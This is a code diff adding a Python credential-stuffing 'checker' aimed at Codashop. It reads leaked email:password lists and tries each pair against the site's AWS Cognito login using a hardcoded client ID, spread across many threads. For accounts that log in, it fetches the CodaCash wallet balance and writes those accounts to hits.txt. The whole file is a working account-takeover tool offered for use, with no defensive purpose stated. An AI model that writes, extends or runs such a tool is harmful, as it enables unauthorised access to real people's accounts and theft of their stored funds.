@@ -1,0 +1,180 @@
+import requests
+import json
+from concurrent.futures import ThreadPoolExecutor
+import time
+
+def load_combo_file(filename):
+    """Load email:password combinations from file"""
+    with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
+        return [line.strip() for line in f if ':' in line]
+
+def check_account(combo):
+    """Check a single account"""
+    email, password = combo.split(':', 1)
+    result = {
+        'email': email,
+        'password': password,
+        'status': '',
+        'balance': None,
+        'message': ''
+    }
+    
+    try:
+        # Step 1: Authenticate with Cognito
+        auth_url = "https://cognito-idp.ap-southeast-1.amazonaws.com/"
+        auth_headers = {
+            "Host": "cognito-idp.ap-southeast-1.amazonaws.com",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
+            "Accept": "*/*",
+            "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
+            "Referer": "https://www.codashop.com/",
+            "Content-Type": "application/x-amz-json-1.1",
+            "X-Amz-Target": "AWSCognitoIdentityProviderService.InitiateAuth",
+            "X-Amz-User-Agent": "aws-amplify/0.1.x js",
+            "Origin": "https://www.codashop.com",
+        }
+        
+        auth_payload = {
+            "AuthFlow": "USER_PASSWORD_AUTH",
+            "ClientId": "437f3u0sfh7h0av5rlrrjdtmsb",
+            "AuthParameters": {
+                "USERNAME": email,
+                "PASSWORD": password
+            },
+            "ClientMetadata": {
+                "country_code": "ph",
+                "country_name": "Philippines",
+                "lang_code": "en"
+            }
+        }
+        
+        auth_response = requests.post(
+            auth_url,
+            headers=auth_headers,
+            data=json.dumps(auth_payload),
+            timeout=15
+        )
+        
+        # Check for authentication failure
+        if "UserNotFoundException" in auth_response.text:
+            result['status'] = "failure"
+            result['message'] = "Invalid credentials"
+            return result
+        if "User is not confirmed" in auth_response.text:
+            result['status'] = "failure"
+            result['message'] = "User not confirmed"
+            return result
+            
+        auth_data = auth_response.json()
+        id_token = auth_data.get("AuthenticationResult", {}).get("IdToken", "")
+        
+        if not id_token:
+            result['status'] = "failure"
+            result['message'] = "No token received"
+            return result
+            
+        # Step 2: Get wallet info
+        wallet_url = "https://wallet-api.codacash.com/user/wallet"
+        wallet_headers = {
+            "Host": "wallet-api.codacash.com",
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
+            "Accept": "application/json, text/plain, */*",
+            "Referer": "https://www.codashop.com/",
+            "X-MERCHANT-ID": "ea3ceab4-6c45-5f28-b547-cd5dd4bb05b2",
+            "X-COUNTRY-CODE": "608",
+            "Origin": "https://www.codashop.com",
+            "Authorization": id_token,
+        }
+        
+        wallet_response = requests.get(wallet_url, headers=wallet_headers, timeout=15)
+        wallet_data = wallet_response.json()
+        
+        result_message = wallet_data.get("resultMessage", "")
+        if "Wallet found" not in result_message:
+            result['status'] = "custom"
+            result['message'] = "No wallet"
+            return result
+        
+        balance = wallet_data.get("balanceAmount", 0)
+        result['status'] = "success"
+        result['balance'] = balance
+        result['message'] = "Wallet found"
+        return result
+        
+    except requests.exceptions.Timeout:
+        result['status'] = "error"
+        result['message'] = "Request timeout"
+        return result
+    except Exception as e:
+        result['status'] = "error"
+        result['message'] = str(e)
+        return result
+
+def save_results(results, filename):
+    """Save results to file"""
+    with open(filename, 'a', encoding='utf-8') as f:
+        for result in results:
+            line = f"{result['email']}:{result['password']} | Status: {result['status']}"
+            if result['balance'] is not None:
+                line += f" | Balance: {result['balance']}"
+            line += f" | Message: {result['message']}\n"
+            f.write(line)
+
+def main():
+    print("""
+██████╗ ██╗████████╗██╗  ██╗       █████╗ ██████╗ ██╗
+██╔══██╗██║╚══██╔══╝██║  ██║      ██╔══██╗██╔══██╗██║
+██████╔╝██║   ██║   ███████║█████╗███████║██████╔╝██║
+██╔══██╗██║   ██║   ██╔══██║╚════╝██╔══██║██╔═══╝ ██║
+██║  ██║██║   ██║   ██║  ██║      ██║  ██║██║     ██║
+╚═╝  ╚═╝╚═╝   ╚═╝   ╚═╝  ╚═╝      ╚═╝  ╚═╝╚═╝     ╚═╝
+  ---> EXPLOIT CODASHOP - WEB CHECKER                                                   
+    """)
+    
+    combo_file = input("Enter combo file path (email:pass format): ")
+    threads = int(input("Enter number of threads (recommended 5-10): "))
+    
+    try:
+        combos = load_combo_file(combo_file)
+        print(f"\nLoaded {len(combos)} accounts from {combo_file}")
+        
+        # Create results files
+        open('hits.txt', 'w').close()
+        open('custom.txt', 'w').close()
+        open('fails.txt', 'w').close()
+        open('errors.txt', 'w').close()
+        
+        print("\nStarting checker...\n")
+        start_time = time.time()
+        checked = 0
+        
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            for result in executor.map(check_account, combos):
+                checked += 1
+                
+                # Print status
+                print(f"[{checked}/{len(combos)}] {result['email']} | {result['status']} | {result['message']}")
+                
+                # Save to appropriate file
+                if result['status'] == "success":
+                    with open('hits.txt', 'a') as f:
+                        f.write(f"{result['email']}:{result['password']} | Balance: {result['balance']}\n")
+                elif result['status'] == "custom":
+                    with open('custom.txt', 'a') as f:
+                        f.write(f"{result['email']}:{result['password']}\n")
+                elif result['status'] == "failure":
+                    with open('fails.txt', 'a') as f:
+                        f.write(f"{result['email']}:{result['password']}\n")
+                else:
+                    with open('errors.txt', 'a') as f:
+                        f.write(f"{result['email']}:{result['password']} | Error: {result['message']}\n")
+        
+        elapsed = time.time() - start_time
+        print(f"\nFinished checking {len(combos)} accounts in {elapsed:.2f} seconds")
+        print(f"Results saved in hits.txt, custom.txt, fails.txt, and errors.txt")
+        
+    except Exception as e:
+        print(f"Error: {e}")
+
+if __name__ == "__main__":
+    main()
